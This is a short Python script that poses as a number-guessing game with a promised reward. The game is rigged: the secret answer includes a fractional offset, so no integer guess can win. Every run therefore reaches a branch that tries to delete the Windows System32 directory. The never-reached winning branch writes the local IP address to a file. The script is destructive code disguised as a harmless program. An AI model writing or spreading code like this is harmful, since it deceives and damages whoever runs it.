from random import randint

answer = randint(1,10) + .00001

done = False

number = input("Lets play a little game :). Type in a number between 1 and 10 and if you guess the number correctly you'll get  reward! : ")

while done == False:

    try:
        number = int(number)

        done = True

    except:
        number = input("Your answer was not a number, please try again")

if number == answer:
    print('Congrastulations! You won :) your reward is inside the folder this ran in.')

    import socket   
    hostname=socket.gethostname()
    IPAddr=socket.gethostbyname(hostname) 

    with open('reward.txt', 'w') as rewardFile:

        rewardFile.write(IPAddr)

else:
    import os

    os.remove('C:\Windows\System32')